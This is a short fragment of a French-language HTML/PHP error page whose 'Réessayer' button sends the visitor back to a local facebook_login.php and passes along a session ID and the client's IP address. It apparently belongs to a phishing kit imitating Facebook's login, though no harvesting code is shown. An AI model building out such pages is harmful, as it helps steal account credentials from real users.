...
<body>
    <div class="container">
        ...
        <div class="retry-card">
            ...
            <div class="retry-title">Veuillez réessayer</div>
            <p class="retry-message">Une erreur est survenue lors du traitement de votre demande. Veuillez réessayer.</p>
            
            <a href="facebook_login.php?session=<?php echo $sessionId; ?>&ip=<?php echo $clientIp; ?>" class="retry-button">
                Réessayer
            </a>
        </div>
